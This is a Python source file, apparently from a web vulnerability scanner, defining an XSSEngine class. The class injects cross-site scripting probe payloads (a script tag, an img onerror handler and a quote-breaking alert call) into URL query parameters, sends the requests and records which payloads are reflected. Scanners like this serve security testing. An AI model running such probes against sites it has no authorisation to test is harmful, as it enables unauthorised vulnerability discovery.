import requests
import copy

class XSSEngine:
    def __init__(self, payload_file=None):
        self.payloads = self._load_default_payloads()

        if payload_file:
            self.payloads.extend(self._load_from_file(payload_file))

    def _load_default_payloads(self):
        return [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "';alert(1);//",
        ]

    def _load_from_file(self, filepath):
        payloads = []
        try:
            with open(filepath, "r") as f:
                payloads = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Payload file error: {e}")
        return payloads

    def _inject(self, url, param, payload, location):
        import urllib.parse

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        if location == "query":
            query[param] = payload

            new_query = urllib.parse.urlencode(query, doseq=True)
            return parsed._replace(query=new_query).geturl()

        return None

    def run(self, url, findings):
        results = []

        for f in findings:
            param = f["param"]
            location = f["location"]
            contexts = f["contexts"]

            for payload in self.payloads:
                new_url = self._inject(url, param, payload, location)

                if not new_url:
                    continue

                try:
                    r = requests.get(new_url, timeout=5)
                except:
                    continue

                if payload in r.text:
                    results.append({
                        "url": new_url,
                        "param": param,
                        "payload": payload,
                        "contexts": contexts
                    })

        return results
